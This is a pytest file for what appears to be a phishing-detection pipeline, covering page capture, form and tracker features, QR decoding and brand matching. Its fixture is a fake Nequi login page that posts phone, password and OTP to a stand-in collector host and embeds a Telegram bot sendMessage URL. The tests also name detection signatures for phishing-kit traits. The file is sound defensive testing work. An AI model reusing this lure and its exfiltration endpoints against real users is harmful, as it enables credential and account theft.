"""Page capture, content features and visual brand identification (phase 2, WS3-WS5)."""

import io
from typing import Dict, List, Optional
from unittest.mock import patch

import numpy as np
import pytest
import requests
import zxingcpp
from PIL import Image, ImageDraw

from src.capture.service import PageCapture, capture_hashes, favicon_urls, fetch_page
from src.detection.features import (
    brand_mentions,
    kit_traits,
    page_features,
    qr_urls,
    signatures_version,
    tracker_ids,
)
from src.detection.imagehash import favicon_mmh3, fingerprint
from src.detection.normalize import Brand, BrandAsset, BrandCatalog, normalize_host
from src.detection.visual_brand import identify_brands
from src.dns.network_utils import SSRFRedirectError

PHISH_HTML = """<!doctype html><html><head><title>Nequi - Ingresa a tu cuenta</title>
<link rel="shortcut icon" href="/static/fav.png"></head><body>
<h1>Nequi</h1><p>Actualiza tus datos con tu clave dinámica</p>
<form action="https://collector-demo.net/save.php" method="post">
<input name="celular" placeholder="Número de celular">
<input type="password" name="clave">
<input name="codigo_otp" autocomplete="one-time-code">
</form>
<script>gtag('config', 'G-ABC123XYZ9'); var t='https://api.telegram.org/bot123456789:AAEhBP0av18d8o0yXHmbvH6m4hX9e3Qx1wE/sendMessage';</script>
</body></html>"""


class FakeResponse:
    def __init__(self, body: bytes, status: int = 200, headers: Optional[Dict[str, str]] = None):
        self._body = body
        self.status_code = status
        self.headers = headers or {"Content-Type": "text/html; charset=utf-8"}
        self.encoding = "utf-8"

    def iter_content(self, chunk_size: int = 65536):
        for start in range(0, len(self._body), chunk_size):
            yield self._body[start : start + chunk_size]

    def close(self) -> None:
        pass


def _png(color="green", size=(32, 32)) -> bytes:
    image = Image.new("RGB", size, "white")
    ImageDraw.Draw(image).ellipse((2, 2, size[0] - 2, size[1] - 2), fill=color)
    buffer = io.BytesIO()
    image.save(buffer, "PNG")
    return buffer.getvalue()


CATALOG = BrandCatalog(
    [
        Brand(
            "nequi",
            "Nequi",
            (),
            ("nequi.com.co",),
            (
                BrandAsset(
                    "favicon",
                    favicon_mmh3(_png()),
                    fingerprint(_png()).phash,
                    fingerprint(_png()).dhash,
                ),
            ),
            1,
            ("clave dinámica", "actualiza tus datos"),
        ),
        Brand("paypal", "PayPal", (), ("paypal.com",)),
    ]
)


def _fake_get(pages: Dict[str, FakeResponse]):
    def getter(url, **kwargs):
        hops: Optional[List] = kwargs.get("hops")
        if url not in pages:
            raise requests.ConnectionError("unknown host")
        if hops is not None:
            hops.append({"url": url, "status": pages[url].status_code})
        return pages[url]

    return getter


class TestFetchPage:
    def test_a_page_with_its_favicon(self):
        pages = {
            "https://nequi-pagos-demo.com/": FakeResponse(PHISH_HTML.encode()),
            "https://nequi-pagos-demo.com/static/fav.png": FakeResponse(_png(), headers={}),
        }
        with (
            patch("src.capture.service.safe_get_with_redirects", side_effect=_fake_get(pages)),
            patch("src.capture.service._server_ip", return_value="203.0.113.7"),
        ):
            capture = fetch_page("https://nequi-pagos-demo.com/")

        assert capture.ok and capture.http_status == 200 and capture.tls_valid is True
        assert "Ingresa a tu cuenta" in capture.html
        assert capture.favicon == _png() and (capture.favicon_url or "").endswith("/static/fav.png")
        assert capture.server_ip == "203.0.113.7"
        assert capture.redirect_chain == [{"url": "https://nequi-pagos-demo.com/", "status": 200}]

    def test_blocked_timeout_and_errors_are_statuses(self):
        def raises(error):
            return patch("src.capture.service.safe_get_with_redirects", side_effect=error)

        with raises(SSRFRedirectError("http://10.0.0.1/", "blocked")):
            assert fetch_page("http://10.0.0.1/").status == "blocked"
        with raises(requests.Timeout()):
            assert fetch_page("https://slow-demo.com/").status == "timeout"
        with raises(requests.ConnectionError()):
            capture = fetch_page("https://gone-demo.com/")
            assert capture.status == "error" and capture.error == "ConnectionError"

    def test_an_invalid_certificate_is_recorded_and_the_page_still_read(self):
        calls = []

        def getter(url, **kwargs):
            calls.append(kwargs.get("verify", True))
            if kwargs.get("verify", True):
                raise requests.exceptions.SSLError("bad certificate")
            kwargs["hops"].append({"url": url, "status": 200})
            return FakeResponse(b"<html><title>x</title></html>")

        with patch("src.capture.service.safe_get_with_redirects", side_effect=getter):
            capture = fetch_page("https://self-signed-demo.com/", with_favicon=False)

        assert capture.ok and capture.tls_valid is False and calls == [True, False]

    def test_the_html_is_capped(self, monkeypatch):
        monkeypatch.setattr("src.capture.service.MAX_HTML_BYTES", 10)
        with patch(
            "src.capture.service.safe_get_with_redirects",
            side_effect=_fake_get({"https://big-demo.com/": FakeResponse(b"x" * 1000)}),
        ):
            assert len(fetch_page("https://big-demo.com/", with_favicon=False).html) == 10

    def test_favicon_urls(self):
        html = '<link rel="icon" href="/a.ico"><link rel="apple-touch-icon" href="b.png">'

        assert favicon_urls(html, "https://x-demo.com/p/") == [
            "https://x-demo.com/a.ico",
            "https://x-demo.com/p/b.png",
            "https://x-demo.com/favicon.ico",
        ]


class TestFeatures:
    def _capture(self, html=PHISH_HTML, screenshot=None) -> PageCapture:
        return PageCapture(
            url="https://nequi-pagos-demo.com/",
            status="ok",
            final_url="https://nequi-pagos-demo.com/",
            http_status=200,
            headers={"content-type": "text/html"},
            redirect_chain=[{"url": "https://nequi-pagos-demo.com/", "status": 200}],
            html=html,
            tls_valid=True,
            favicon=_png(),
            screenshot=screenshot,
        )

    def test_page_features(self):
        features = page_features(self._capture(), CATALOG)

        assert features["password_fields"] == 1 and features["otp_fields"] == 1
        assert features["credential_form"] is True
        assert features["external_form_actions"] == 1
        assert features["form_action_domains"] == ["collector-demo.net"]
        assert features["kit_traits"] == {"telegram_bot_api": "strong"}
        assert features["trackers"] == {"ga4": ["G-ABC123XYZ9"]}
        assert features["title_brands"] == ["nequi"] and features["lure_hits"] == 2
        assert features["missing_hsts"] and features["redirect_hops"] == 0
        assert features["signatures_version"] == signatures_version()

    def test_an_empty_capture_keeps_transport_features(self):
        capture = PageCapture(url="https://gone-demo.com/", status="error", error="ConnectionError")

        assert page_features(capture, CATALOG) == {
            "capture_status": "error",
            "http_status": None,
            "tls_valid": None,
            "signatures_version": signatures_version(),
            "redirect_hops": 0,
            "cross_domain_redirect": False,
            "final_domain_differs": False,
        }

    def test_cross_domain_redirects(self):
        capture = self._capture()
        capture.redirect_chain = [
            {"url": "https://bit.ly/x", "status": 301},
            {"url": "https://nequi-pagos-demo.com/", "status": 200},
        ]
        capture.url = "https://bit.ly/x"

        features = page_features(capture, CATALOG)

        assert features["redirect_hops"] == 1
        assert features["cross_domain_redirect"] and features["final_domain_differs"]

    def test_kit_traits_and_trackers_alone(self):
        assert kit_traits("<p>nothing</p>") == {}
        assert kit_traits("", {"x-evilginx": "1"}) == {"evilginx_header_leak": "strong"}
        assert tracker_ids("GTM-AB12CD UA-1234567-1 fbq('init', '123456789012345')") == {
            "ua": ["UA-1234567-1"],
            "gtm": ["GTM-AB12CD"],
            "meta_pixel": ["123456789012345"],
        }

    def test_brand_mentions_use_whole_words(self):
        mentions = brand_mentions("Welcome to Meridian", "meridian shop", CATALOG)

        assert mentions["title_brands"] == [] and mentions["text_brands"] == []

    def test_qr_codes_in_the_screenshot_are_decoded(self):
        matrix = zxingcpp.write_barcode(
            zxingcpp.BarcodeFormat.QRCode, "https://qr-target-demo.com/pay"
        )
        qr = Image.fromarray(np.asarray(matrix)).resize((300, 300), Image.Resampling.NEAREST)
        page = Image.new("RGB", (800, 600), "white")
        page.paste(qr, (250, 150))
        buffer = io.BytesIO()
        page.save(buffer, "PNG")

        assert qr_urls(buffer.getvalue()) == ["https://qr-target-demo.com/pay"]
        assert qr_urls(None) == [] and qr_urls(b"not an image") == []


class TestVisualBrand:
    def test_the_brand_favicon_on_another_domain_is_a_mismatch(self):
        capture = TestFeatures()._capture()
        features = page_features(capture, CATALOG)

        result = identify_brands(
            capture_hashes(capture), features, normalize_host(capture.final_url or ""), CATALOG
        )

        assert result["top_brand"] == "nequi" and result["top_score"] == 1.0
        assert "favicon_exact" in result["brands"][0]["methods"]
        assert result["brand_domain_mismatch"] and result["credential_form_for_other_brand"]

    def test_the_brand_on_its_own_domain_is_consistent(self):
        features = {"title_brands": ["nequi"], "credential_form": True}

        result = identify_brands({}, features, normalize_host("https://www.nequi.com.co/"), CATALOG)

        assert result["official_brand"] == "nequi" and not result["brand_domain_mismatch"]

    def test_text_mentions_alone_are_weak(self):
        result = identify_brands(
            {}, {"text_brands": ["paypal"]}, normalize_host("https://blog-demo.com/"), CATALOG
        )

        assert result["top_brand"] == "paypal" and not result["brand_domain_mismatch"]

    def test_no_signal_no_brand(self):
        assert (
            identify_brands({}, {}, normalize_host("https://x-demo.com/"), CATALOG)["top_brand"]
            is None
        )


@pytest.mark.parametrize("missing", ["favicon", "screenshot"])
def test_capture_hashes_tolerate_missing_images(missing):
    capture = TestFeatures()._capture()
    setattr(capture, missing, None)

    hashes = capture_hashes(capture)

    assert hashes["html_tlsh"] and hashes["html_sha256"]
    assert (hashes["favicon_mmh3"] is None) == (missing == "favicon")
